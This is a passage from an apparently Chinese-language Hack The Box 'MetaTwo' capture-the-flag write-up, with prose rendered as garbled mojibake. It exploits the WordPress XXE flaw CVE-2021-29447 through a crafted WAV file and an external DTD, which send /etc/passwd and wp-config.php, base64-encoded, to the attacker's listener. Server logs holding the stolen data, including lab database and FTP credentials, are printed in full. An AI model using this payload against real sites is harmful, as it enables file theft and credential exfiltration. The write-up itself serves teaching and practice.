partylikearockstar\n\nä½¿ç”¨è¿™ä¸ªå¯†ç å» [http://metapress.htb/wp-admin/](http://metapress.htb/wp-admin/) è¿›è¡Œç™»é™†\n\n```bash\nusername = manager\npassword = partylikearockstar\n```\n> [https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)\n\n> [https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)\n\nç»è¿‡ç‰ˆæœ¬æœç´¢ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ª 5.6.2 å­˜åœ¨çš„ XXEæ¼æ´\n\nè¿™ä¸ªæ¼æ´çš„å¤§è‡´è§£é‡Šå°±æ˜¯ï¼ŒWordPress çš„ä½œè€…ï¼ˆå¯ç¼–è¾‘è€…ï¼‰å¯ä»¥å°†åª’ä½“æ–‡ä»¶ä¸Šä¼ åˆ° WordPress åª’ä½“åº“ï¼Œä»¥ä¾¿åœ¨å¸–å­ä¸­ä½¿ç”¨å®ƒã€‚ä¸Šä¼  WAVE éŸ³é¢‘æ–‡ä»¶åï¼ŒWordPress å‡½æ•°ä¼šä»åŒ…å«æ¶æ„ XML å¤–éƒ¨å®ä½“çš„å˜é‡ä¸­åŒ…å« `wp_read_audio_metadata()` çš„ iXML å…ƒæ•°æ®ä¸­æå–éŸ³é¢‘ä¿¡æ¯ã€‚\n\n```bash\necho -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.84:9000/evil.dtd'\"'\"'>%remote;%init;%trick;]>\\x00' > payload.wav\n```\nä¿®æ”¹å¥½æˆ‘ä»¬çš„ payloadï¼Œç„¶åç”Ÿæˆä¸€ä¸ª payload\n\nç„¶ååœ¨ evil.dtd ä¸­ï¼Œæ”¾å…¥æˆ‘ä»¬çš„æ¶æ„ XML ä»£ç \n\n```bash\n<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\" >\n<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.84:9000/?p=%file;'>\">\n```\næ¥ç€ä½¿ç”¨ PHP å¼€å¯ä¸€ä¸ª http æœåŠ¡å™¨\n\n```bash\nphp -S 0.0.0.0:9000\n```\næ¥ç€æˆ‘ä»¬ç‚¹å‡»å·¦ä¾§ä»ªè¡¨ç›˜çš„ Media -> Library å¹¶ä¸Šä¼ æˆ‘ä»¬çš„ payload.wav\n\n![image](Hackthebox-MetaTwo/cRE-S9q01Pn_cr4X18m_UTTZ3B5IXisa6P_xyiMnF_Y.png)\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# php -S 0.0.0.0:9000\n[Sat Dec 31 13:35:59 2022] PHP 8.1.12 Development Server (http://0.0.0.0:9000) started\n[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 Accepted\n[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 [200]: GET /evil.dtd\n[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 Closing\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 Accepted\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 Closing\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 Accepted\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 [200]: GET /evil.dtd\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 Closing\n[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 Accepted\n[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory\n[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 Closing\n```\nè¿™é‡Œä¼ å›æ¥äº†ä¸€æ®µ base64ï¼Œå»è§£å¯†çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo'|base64 -d\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsshd:x:104:65534::/run/sshd:/usr/sbin/nologin\njnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash\nsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin\nsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false\nproftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin\nftp:x:107:65534::/srv/ftp:/usr/sbin/nologin\nbase64: æ— æ•ˆçš„è¾“å…¥\n```\nç¡®å®æˆåŠŸå¼¹å›æ¥äº†ï¼Œé‚£æˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½è·å–åˆ° wp-config.php\n\n```bash\n<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=../wp-config.php\" >\n<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.84:9000/?p=%file;'>\">\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# php -S 0.0.0.0:9000\n[Sat Dec 31 13:55:53 2022] PHP 8.1.12 Development Server (http://0.0.0.0:9000) started\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 Accepted\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 [200]: GET /evil.dtd\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 Closing\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 Accepted\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directory\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 Closing\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 Accepted\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 [200]: GET /evil.dtd\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 Closing\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 Accepted\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directory\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 